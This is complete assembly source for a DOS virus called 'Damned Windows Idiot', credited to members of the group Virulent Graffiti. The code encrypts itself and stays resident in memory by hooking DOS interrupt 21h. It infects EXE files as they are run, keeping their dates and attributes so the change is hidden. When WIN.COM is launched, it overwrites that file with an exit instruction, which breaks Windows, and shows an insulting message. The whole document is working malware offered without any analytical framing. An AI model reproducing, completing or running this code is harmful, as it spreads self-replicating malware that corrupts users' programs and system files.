; [][]   []      [] [][][]   "Damned Windows Idiot!" or Anti-Windows...
; [] ][  []      []   []     
; []  [] []      []   []          An original Viral Artform by
; []  [] []  []  []   []      AccuPunk and The Attitude Adjuster of
; [] ][  [] ][][ []   []     Virulent Graffiti, 216/513/914/602/703!
; [][]    ][    ][  [][][]

;       "Hey, you... with the shitty logo... Yeah, you! Get over here!"

.model tiny
.code
        org     100h

id_word   equ   '1V'                                    ; Marker Word
                                                        ; V1 in Lil' Endian
entry:
     mov       bx, offset endcrypt                      ; Virus Start
     mov       cx, (end_write-endcrypt)/2               ; Ieterations
Valu:     
     mov       dx, 0000h                                ; Xor Word
Crypt_Loop:
     xor       word ptr cs:[bx], dx                     ; Xor It (CS Ovr'rd)
     ror       word ptr cs:[bx], 1                      ; Roll it Right!
     inc       bx
     inc       bx
     loop      Crypt_Loop
EndCrypt:

     push      ds es                                    ; Save Segments
     
     push      cs cs                                    ; CS=DS=ES
     pop       ds es
     
     mov       ax, 0ABCDh                               ; R-U-There?
     int       21h  
     cmp       ax, 6969h                                ; Ax=6969h Vir_Ident    
     jne       put_vir_in_mem                           ; No.

exit:
     pop       es ds                                    ; Restore Segments

     mov       ax, es                                   ; AX = PSP segment
     add       ax, 10h                                  ; Adjust for PSP
     mov       cx, ax

     add       ax, word ptr cs:[stacksave]              ; Adjust SS
     
     cli
     mov       sp, word ptr cs:[stacksave+2]            ; Set SP
     mov       ss, ax                                   ; Set SS
     sti
     
     mov       bx, word ptr cs:[jmpsave+2]              ; Adjust CodeSeg
     add       bx, cx
     push      bx                                       ; Save It

     mov       bx, word ptr cs:[jmpsave]                ; Load IP
     push      bx                                       ; Save It

     retf                                               ; Exit Virus

jmpsave        dd 0fff00000h                            ; Point to INT 20h
stacksave      dd ?                                     ; Nada.

put_vir_in_mem:
     xor       ax,ax                                    ; Interrupt Table
     mov       ds,ax
     les       bx, dword ptr ds:[21h*4]                 ; Int 21h Vector
     
     mov       word ptr cs:[old_int_21], bx             ; Save Int 21h
     mov       word ptr ds:[30h*4],bx                   ; Revector 30h
     mov       word ptr cs:[old_int_21+2], es
     mov       word ptr ds:[30h*4+2], es
     
     push      cs cs                                    ; Restore Segments 
     pop       es ds
     
     mov       ax, 5800h                                ; Get Mem Alloc
     int       21h

     push      ax                                       ; Save Strategy

     mov       bx, 2
     mov       ax, 5801h                                ; Set to Last Fit
     int       21h

     mov       bx, ((end_vir - entry) / 16) + 1
     mov       ah, 48h                                  ; Allocate Block
     int       21h

     push      ax                                       ; Returned in AX
     sub       ax, 10h                                  ; Base Ofs 100h
     mov       es, ax                                   ; Our Segment
     
     mov       di, 100h                                 ; Entry = 100h
     mov       si, di                                   ; Entry = 100h
     mov       cx, end_write - entry                    ; Bytes to Zopy
     rep       movsb
     
     xor       cx, cx                                   ; Interrupt Table
     push      cx     
     pop       ds

     cli
     mov       word ptr ds:[21h*4], offset Int_21_handler     ; Set Int 21h
     mov       word ptr ds:[21h*4+2], ax
     sti

     pop       ax
     sub       ax, 1
     mov       es, ax                                   ; Point To MCB
     mov       word ptr es:[0001], 0008                 ; Config = 0008h

     mov       ax, 5801h                                ; Reset Strategy
     pop       bx
     int       21h
     
     jmp       exit                                     ; Exit Stub

int_21_handler:      
     push      ax bx cx dx si di bp es ds               ; Save Registers
     
     cmp       ax, 0ABCDh                               ; R-U-There? 
     je        r_u_there

     cmp       ax, 4B00h                                ; DOS Exec? 
     je        exec_call

back_to_dos:
     pop       ds es bp di si dx cx bx ax               ; Restore Registers
     
     db        0eah                                     ; JMP XXXX:YYYY
old_int_21     dd   ?

remove_locks:
     xor       ax,ax                                    ; Interrupt Table
     mov       ds,ax
     les       ax, dword ptr cs:[Old24]                 ; Get Int 24h Vector
     
     mov       word ptr ds:[24h*4], Ax                  ; And Replace It
     mov       word ptr ds:[24h*4+2], Es
     jmp       back_to_dos

r_u_there:
     mov       bp, sp                                   ; Alter AX On Stack
     mov       word ptr [bp+10h], 6969h
     jmp       end_int_21

exec_call:
     xor       ax,ax                                    ; Revector Int 24h
     mov       ds,ax
     les       ax, DWord Ptr ds:[24h*4]
     
     mov       word ptr cs:[Old24], ax                  ; Save Old Vector
     mov       word ptr cs:[Old24+2], es
     
     mov       word ptr ds:[24h*4], Offset My24         ; With Our Vector
     mov       word ptr ds:[24h*4+2], cs

     pop       es                                       ; Caller's Ds in Es
     push      es
     
     mov       di, dx                                   ; ES:DI -> filename
     push      cs
     pop       ds                                       ; DS:SI -> "WIN.COM"
     mov       si, offset win_com
     push      si

find_top:
     pop       si
     push      si
     lodsb                                              ; AL = "W" 
     
     mov       cx, 128
     repnz     scasb                                    ; Scan For "W"
     je        check_it                                 ; Got a "W", Check It
     pop       si
     jmp       infect                                   ; Not WIN.COM

check_it:
     mov       cl, 7

check_char:
     lodsb                                              ; Load Next Character
     scasb                                              ; and Check it
     jne       find_top                                 ; Leave if < >
     loop      check_char

     pop       si
     
nuke_windows:
     push      es
     pop       ds
     
     mov       ax, 3d02h                                ; Open WIN.COM        
     int       30h

     xchg      ax,bx                                    ; Handle in BX

     push      cs
     pop       ds

     mov       ah, 40h                                  ; Write WIN.COM
     mov       cx, (my24-win_exit)-1
     mov       dx, offset win_exit                      ; with CD 20h
     int       30h
     
     mov       ah, 3eh                                  ; Close File
     int       30h
     
     mov       ah, 9                                    ; Show User Message
     mov       dx, offset win_msg
     int       30h
    
end_int_21: 
     pop       ds es bp di si dx cx bx ax               ; Restore Registers
     iret

infect:                                                 ; File Infection
     push      es
     pop       ds

     mov       si, dx                                   ; DS:SI -> filename
     push      cs
     pop       es             
     mov       di, offset fname
LoopAgain:                                              ; Copy filename into
     lodsb                                              ; Our CodeSeg.
     stosb
     or        al,al
     jnz       LoopAgain
     
     push      cs                                       ; CS=DS=ES
     pop       ds
     
     xor       ax, ax                                   ; Get Attributes 
     call      attributes

     mov       word ptr [fattr], cx                     ; Save Attributes

     mov       ax, 3D00h                                ; Open File
     int       30h       
     jc        bad_exe

     xchg      ax, bx                                   ; BX = File Handle
     
     mov       ax, 5700h                                ; Get File Date/Time
     int       30h
     
     mov       ftime, cx                                ; Save Time
     mov       fdate, dx                                ; And Date
     
     mov       ah, 3Fh                                  ; Read Header
     mov       cx, 1ah
     mov       dx, offset buffer                        ; Into Buffer
     int       30h     

     call      LSeekEnd                                 ; LSeek the End

     push      dx                                       ; Save File Size
     push      ax

     mov       ah, 3Eh                                  ; Close File
     int       30h
     
     cmp       word ptr [buffer], 'ZM'
     jne       worse_exe                                ; Not an EXE File

     cmp       word ptr [buffer+12h], id_word
     jne       good_exe                                 ; Not Infected

worse_exe:
     pop       dx                                       ; Remove Saved File
     pop       dx                                       ; Size
bad_exe:
     jmp       remove_locks                             ; Abort Infection

good_exe:
     mov       al, 01h                                  ; Overwrite Attribs
     xor       cx, cx
     call      attributes     
     jc        worse_exe                                ; Catch Write-Prot
                                                        ; Discs Here
     push      cs
     pop       es
     
     mov       si, offset buffer + 14h                  ; Save Initial CS:IP
     mov       di, offset jmpsave                       ; In Segment
     
     movsw
     movsw
     
     sub       si, 10                                   ; Save Initial SS:SP
     
     movsw
     movsw
     
     pop       ax dx                                    ; Retrive File Size
     push      ax dx                                    ; Save It

     add       ax, offset end_write - offset entry
     adc       dx, 0
     
     mov       cx, 512                                  ; Pages 512 Bytes
     div       cx             
     or        dx, dx
     jz        no_round
     inc       ax                                       ; Rounding Quirk

no_round:
     mov       word ptr [buffer + 4], ax                ; Set Total 512 pages
     mov       word ptr [buffer + 2], dx                ; Set Total mod 512

     mov       ax, word ptr [buffer + 0Ah]              ; Get Minimum
     add       ax, (end_write - entry)/16               ; Add our Size
     mov       word ptr [buffer + 0ah], ax              ; Put us in Minimum
     mov       word ptr [buffer + 0ch], ax              ; and in the Maximum
     
     pop       dx ax                                    ; Retrieve File Size
     
     mov       cl, 4
     mov       bx, word ptr [buffer + 8]
     shl       bx, cl                                   ; BX = Header Size
     sub       ax, bx
     sbb       dx, 0                                    ; Subtract Header
     
     mov       cx, 10h        
     div       cx                                       ; Change To Para/Rem
     or        dx, dx
     jz        no_padding
     sub       cx, dx                                   ; CX = Bytes to Pad
     inc       ax

no_padding:
     push      cx                                       ; Save Pad Bytes
     sub       ax, 10h        
     mov       word ptr [buffer + 14h], offset entry           ; Set IP
     mov       word ptr [buffer + 16h], ax                     ; Set CS
     mov       word ptr [buffer + 0Eh], ax                     ; Set SS
     mov       word ptr [buffer + 10h], offset end_vir+100h    ; Set SP

move_id:     
     mov       word ptr [buffer + 12h], id_word         ; Set ID Word
                                                        ; Negative Checksum
     
     mov       ax, 3D02h                                ; Open File
     mov       dx, offset fname
     int       30h
     
     xchg      ax, bx                                   ; BX = File Handle

     mov       ah, 40h                                  ; Write File
     mov       cx, 1Ah
     mov       dx, offset buffer
     int       30h

     call      LSeekEnd                                 ; LSeek to End
     
     pop       cx                                       ; Retrieve Padding
     cmp       cx, 16    
     je        no_fixup                                 ; None Needed
     
     mov       ah, 40h                                  ; Write File
     int       30h

no_fixup:
     mov       ah, 2ch                                  ; Get Time
     int       21h

     mov       word ptr [Valu+1], Dx                    ; New Crypt Valu
    
     mov       si, offset writeret                      ; Copy Write
     mov       di, offset tempcrypt                     ; Routine
     mov       cx, (end_write-writeret)
     rep       movsb
    
     call      tempcrypt                                ; Call Write Routine

     mov       ax, 5701h                                ; Set File Time/Date
     mov       cx, ftime
     mov       dx, fdate
     int       30h
     
     mov       ah, 3Eh                                  ; Close File
     int       30h

     mov       al, 01h                                  ; Reset Attribs
     mov       cx, fattr
     call      attributes

     jmp       remove_locks                             ; Remove Int 24h

vir_ident      db   0,'[DWI] AccuPunk/'                 ; Virus and Author
               db     'The Attitude Adjuster'           ; Idents
               
vir_group      db   0,'Virulent Graffiti',0             ; Group Ident

win_com        db   'WIN.COM',0                         ; Target File
win_exit       db   0cdh, 20h                           ; DOS Exit
win_msg        db   0dh,0ah                             ; Message
               db   'You''ve been caught, you DWI! You''re nothing '
               db   'but a Damn  Windows  Idiot!',0dh,0ah
               db   'Well, we at Virulent Graffiti have  had it...  '
               db   'you''re  not going  to be',0dh,0ah
               db   'running that bullshit for a while, ''cuz, hey, '
               db   'friends don''t let friends',0dh,0ah
               db   'use Windows!  (and you''re damn right we''re '
               db   'your friends!)',0dh,0ah,'$'
my24:                                                   ; Error Handler
     mov       al, 3                                    ; Process Terminate
     iret

Attributes:                                             ; Get/Set
     mov       ah, 43h
     mov       dx, offset fname
     int       30h
     ret

LSeekEnd:
     mov       ax, 4202h                                ; LSeek from End
     xor       cx, cx
     cwd                                                ; XOR DX, DX
     int       30h                                      ; Kudos DA
     ret

WriteRet:
     push      bx                                       ; Handle

     mov       bx, offset endcrypt                      ; Virus Start
     mov       cx, (end_write-endcrypt)/2               ; Ieterations
     mov       dx, Word Ptr [Valu+1]                    ; Xor Word
Crypt_Loop2:
     rol       word ptr [bx], 1                         ; Roll it Left!
     xor       word ptr [bx], dx                        ; Xor It 
     inc       bx
     inc       bx
     loop      Crypt_Loop2
     
     pop       bx                                       ; Handle

     mov       ah, 40h                                  ; Write File
     mov       cx, end_write - entry
     mov       dx, offset entry
     int       30h
     
     push      bx                                       ; Handle
     
     mov       bx, offset endcrypt                      ; Virus Start
     mov       cx, (end_write-endcrypt)/2               ; Ieterations
     mov       dx, Word Ptr [Valu+1]                    ; Xor Word     
Crypt_Loop3:
     xor       word ptr [bx], dx                        ; Xor It
     ror       word ptr [bx], 1                         ; Roll it Left!
     inc       bx
     inc       bx
     loop      Crypt_Loop3
     
     pop       bx                                       ; Handle
     ret                                                ; Return
end_write:

  old24          dd   0                                 ; Int 24h Vector
  buffer         db   1Ah dup (0)                       ; EXE Read Buffer
  fname          db   128 dup (0)                       ; Filename Buffer
  fdate          dw   0                                 ; OldFileDate
  ftime          dw   0                                 ; OldFileTime
  fattr          dw   0                                 ; OldFileAttr
  
tempcrypt:      
                 db   (end_write-writeret) Dup(0)       ; Write Routine
end_vir:

     end       entry     

 

